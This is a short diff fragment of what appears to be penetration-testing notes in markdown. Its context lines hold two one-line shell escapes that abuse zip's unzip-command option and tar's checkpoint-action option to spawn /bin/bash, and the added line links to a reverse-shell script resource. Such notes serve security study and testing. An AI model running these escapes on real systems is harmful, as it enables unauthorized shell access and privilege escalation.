@@ -77,3 +77,4 @@ zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
 tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
 ```
 ### Useful website
+[Pentest Monkey (Reverse shell script) ](http://pentestmonkey.net/)
